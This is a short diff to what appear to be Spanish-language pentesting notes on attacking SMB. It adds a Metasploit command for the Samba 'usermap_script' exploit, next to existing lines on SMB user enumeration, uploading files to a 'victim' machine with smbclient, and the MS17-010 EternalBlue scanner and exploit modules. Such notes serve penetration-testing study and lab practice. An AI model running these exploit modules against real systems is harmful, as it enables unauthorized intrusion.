@@ -90,6 +90,8 @@ Enumerar info SMB
 	smb-enum-users.nse -p U:137,T:139
   	Para acceder a los directorios -> smbclient \\\\[IP Target]\\[Share al que accedemos, carpeta compartida o Share por defecto] -U [username]
   	put [archivo] (sube el archivo al directorio del ordenador víctima)
+  use exploit/multi/samba/usermap_script
+  	Samba 3.0.
   use auxiliary/scanner/smb/smb_ms17_010
 	Si es vulnerable
 		use exploit/windows/smb/ms17_010_eternalblue
